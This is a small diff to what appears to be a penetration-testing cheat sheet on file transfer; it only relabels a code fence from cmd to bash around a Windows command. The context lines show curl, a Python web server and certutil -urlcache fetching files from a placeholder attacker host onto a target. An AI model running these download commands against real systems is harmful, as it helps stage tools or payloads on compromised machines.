@@ -34,7 +34,7 @@ curl http://<attacker-ip>:<port>/<file> -o <output-file>
 python3 -m http.server 80
 ```
 
-```cmd
+```bash
 # Windows machine (target)
 certutil -urlcache -f http://<attacker-ip>:<port>/<file> <new_file_name>
 ```
